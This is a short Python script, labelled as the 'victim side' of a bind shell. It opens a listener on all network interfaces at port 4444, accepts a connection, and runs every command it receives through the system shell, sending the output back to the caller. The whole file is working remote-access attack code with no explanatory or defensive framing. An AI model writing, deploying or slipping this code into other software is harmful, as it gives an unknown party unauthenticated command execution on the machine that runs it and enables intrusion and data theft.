# bind_shell_client.py — VICTIM SIDE
import socket
import subprocess

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444       # Predefined port

def start_bind_shell():
    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[+] Listening on {HOST}:{PORT} for incoming connection...")

    conn, addr = s.accept()
    print(f"[+] Connection received from {addr}")

    while True:
        try:
            cmd = conn.recv(1024).decode().strip()
            if cmd.lower() == "exit":
                conn.send(b"[+] Closing connection.\n")
                break

            output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            result = output.stdout + output.stderr
            conn.send(result.encode() if result else b"[+] Command executed with no output.\n")

        except Exception as e:
            conn.send(f"[!] Error: {str(e)}\n".encode())
            break

    conn.close()
    s.close()

if __name__ == "__main__":
    start_bind_shell()
